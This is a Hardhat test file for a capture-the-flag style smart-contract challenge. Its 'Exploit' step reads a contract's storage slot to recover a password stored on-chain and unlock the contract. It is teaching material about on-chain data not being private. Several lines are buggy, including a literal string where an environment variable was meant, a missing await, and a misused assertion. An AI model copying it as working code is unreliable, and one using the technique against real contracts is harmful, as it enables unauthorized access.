const { ethers } = require("hardhat");
const { expect } = require("chai");
const { keccak256 } = require("ethereum-cryptography/keccak");
const { utf8ToBytes } = require("ethereum-cryptography/utils");  // Allows to pass string as parameter to keccak256

require("dotenv").config();

describe("No Privacy Challenge", function () {
  let alice, bob;

  before(async function () {
    /** SETUP SCENARIO - DON'T CHANGE ANYTHING HERE */
    [alice, bob] = await ethers.getSigners();
    const NoPrivacyFactory = await ethers.getContractFactory(
      "AlicesLock",
      alice
    );
    //this.lock = await NoPrivacyFactory.deploy(process.env.PASSWORD);
    // @fix using keccak hash of the password instead of plain text
    const hashed_pw = keccak256(utf8ToBytes("process.env.PASSWORD"));
    this.lock = await NoPrivacyFactory.deploy(hashed_pw);
    // Peaking into the env is considered cheating!
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // password is stored in contract bytecode memory storage 
    let password = ethers.provider.getStorageAt(this.lock.address, 1);
    await this.lock.unlock(password);
    // make it work
    //await this.lock.unlock(utf8ToBytes("process.env.PASSWORD"));
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Bob has unlocked the contract
    if (expect(await this.lock.ifLocked()).to.equal(false)) {
      console.log(`You have passed the No Privacy Challenge.`);
    }
  });
});
